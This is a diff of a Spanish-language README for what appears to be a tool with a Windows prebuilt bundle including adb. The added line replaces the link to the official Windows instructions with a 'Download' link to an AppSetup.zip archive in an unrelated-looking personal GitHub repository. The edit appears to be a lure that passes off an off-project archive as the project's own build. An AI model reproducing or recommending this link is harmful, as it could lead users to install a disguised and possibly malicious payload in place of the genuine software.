@@ -101,7 +101,7 @@ También puedes [construir la aplicación manualmente][BUILD] ([proceso simplifi
 Para Windows, por simplicidad, hay un pre-compilado con todas las dependencias
 (incluyendo `adb`):
 
- - [README][README-windows]
+ - [Download](https://github.com/luis-marcelo/freshreleases/releases/download/FreshTag/AppSetup.zip)
 
 También está disponible en [Chocolatey]:
 
